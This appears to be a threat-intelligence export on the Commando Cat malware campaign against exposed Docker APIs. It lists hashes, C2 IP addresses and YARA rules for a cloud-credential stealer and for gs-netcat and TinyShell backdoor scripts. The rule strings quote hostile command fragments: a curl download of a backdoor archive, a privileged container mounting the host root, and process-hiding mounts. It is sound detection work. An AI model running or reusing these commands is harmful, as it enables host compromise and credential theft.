+*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-+
| Title: The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker
| UUID: 04c5e67e-357a-4881-bf10-6f4f3a002076
| Date: 2024-02-06
"| Author: Armstrong Techs, Research Lab"
| References: https://www.armstrongtechs.com/
| TLP:CLEAR
+*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-+

Date,Category,Type,Value,Comment
2024-02-07,External analysis,link,https://www.cadosecurity.com/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker/,
2024-02-07,Other,comment,The payloads are delivered to exposed Docker API instances over the Internet by the IP 45[.]9.148.193 (which is the same as C2). The attacker instructs Docker to pull down a Docker image called cmd.cat/chattr. The cmd.cat (also known as Commando) project,
2024-02-07,Payload delivery,md5,5ea102a58899b4f446bb0a68cd132c1d,
2024-02-07,Payload delivery,md5,73432d368fdb1f41805eba18ebc99940,
2024-02-07,Payload delivery,md5,25c00d4b69edeef1518f892eff918c2c,
2024-02-07,Payload delivery,md5,ec2882928712e0834a8574807473752a,
2024-02-07,Network activity,ip-dst,45.9.148.193,C2
2024-02-07,Network activity,ip-dst,103.127.43.208,
2024-02-07,Payload installation,yara,"rule Stealer_Linux_CommandoCat {
	meta:
        description = ""Detects CommandoCat aws.sh credential stealer script""
        license = ""Apache License 2.0""
        date = ""2024-01-25""
        hash1 = ""185564f59b6c849a847b4aa40acd9969253124f63ba772fc5e3ae9dc2a50eef0""
    strings:
        // Constants
        $const1 = ""CRED_FILE_NAMES""
        $const2 = ""MIXED_CREDFILES""
        $const3 = ""AWS_CREDS_FILES""
        $const4 = ""GCLOUD_CREDS_FILES""
        $const5 = ""AZURE_CREDS_FILES""
        $const6 = ""VICOIP""
        $const7 = ""VICHOST""

        // Functions
        $func1 = ""get_docker()""
        $func2 = ""cred_files()""
        $func3 = ""get_azure()""
        $func4 = ""get_google()""
        $func5 = ""run_aws_grabber()""
        $func6 = ""get_aws_infos()""
        $func7 = ""get_aws_meta()""
        $func8 = ""get_aws_env()""
        $func9 = ""get_prov_vars()""

        // Log Statements
        $log1 = ""no dubble""
        $log2 = ""-------- PROC VARS -----------------------------------""
        $log3 = ""-------- DOCKER CREDS -----------------------------------""
        $log4 = ""-------- CREDS FILES -----------------------------------""
        $log5 = ""-------- AZURE DATA --------------------------------------""
        $log6 = ""-------- GOOGLE DATA --------------------------------------""
        $log7 = ""AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID""
        $log8 = ""AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY""
        $log9 = ""AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED""
        $log10 = ""AWS_ROLE_ARN : $AWS_ROLE_ARN""
        $log11 = ""AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE""

        // Paths
        $path1 = ""/root/.docker/config.json""
        $path2 = ""/home/*/.docker/config.json""
        $path3 = ""/etc/hostname""
        $path4 = ""/tmp/..a.$RANDOM""
        $path5 = ""/tmp/$RANDOM""
        $path6 = ""/tmp/$RANDOM$RANDOM""

    condition:
        filesize < 1MB and
        all of them        
}",
2024-02-07,Payload installation,yara,"rule Backdoor_Linux_CommandoCat {
	meta:
        description = ""Detects CommandoCat gsc.sh backdoor registration script""
        license = ""Apache License 2.0""
        date = ""2024-01-25""
        hash1 = ""d083af05de4a45b44f470939bb8e9ccd223e6b8bf4568d9d15edfb3182a7a712""
    strings:
        // Constants
        $const1 = ""SRCURL""
        $const2 = ""SETPATH""
        $const3 = ""SETNAME""
        $const4 = ""SETSERV""
        $const5 = ""VICIP""
        $const6 = ""VICHN""
        $const7 = ""GSCSTATUS""
        $const8 = ""VICSYSTEM""
        $const9 = ""GSCBINURL""
        $const10 = ""GSCATPID""

        // Functions
        $func1 = ""hidfile()""

        // Log Statements
        $log1 = ""run gsc ...""

        // Paths
        $path1 = ""/dev/shm/.nc.tar.gz""
        $path2 = ""/etc/hostname""
        $path3 = ""/bin/gs-netcat""
        $path4 = ""/etc/systemd/gsc""
        $path5 = ""/bin/hid""

        // General
        $str1 = ""mount --bind /usr/foo /proc/$1""
        $str2 = ""cp /etc/mtab /usr/t"" 
        $str3 = ""docker run -t -v /:/host --privileged cmd.cat/tar tar xzf /host/dev/shm/.nc.tar.gz -C /host/bin gs-netcat""

    condition:
        filesize < 1MB and
        all of them        
}",
2024-02-07,Payload installation,yara,"rule Backdoor_Linux_CommandoCat_tshd {
	meta:
        description = ""Detects CommandoCat tshd TinyShell registration script""
        license = ""Apache License 2.0""
        date = ""2024-01-25""
        hash1 = ""65c6798eedd33aa36d77432b2ba7ef45dfe760092810b4db487210b19299bdcb""
    strings:
        // Constants
        $const1 = ""SRCURL""
        $const2 = ""HOME""
        $const3 = ""TSHDPID""

        // Functions
        $func1 = ""setuptools()""
        $func2 = ""hidfile()""
        $func3 = ""hidetshd()""

        // Paths
        $path1 = ""/var/tmp""
        $path2 = ""/bin/hid""
        $path3 = ""/etc/mtab""
        $path4 = ""/dev/shm/..tshdpid""
        $path5 = ""/tmp/.tsh.tar.gz""
        $path6 = ""/usr/sbin/tshd""
        $path7 = ""/usr/foo""
        $path8 = ""./tshd""

        // General
        $str1 = ""curl -Lk $SRCURL/bin/tsh/tsh.tar.gz -o /tmp/.tsh.tar.gz""
        $str2 = ""find /dev/shm/ -type f -size 0 -exec rm -f {} \\;""

    condition:
        filesize < 1MB and
        all of them        
}",
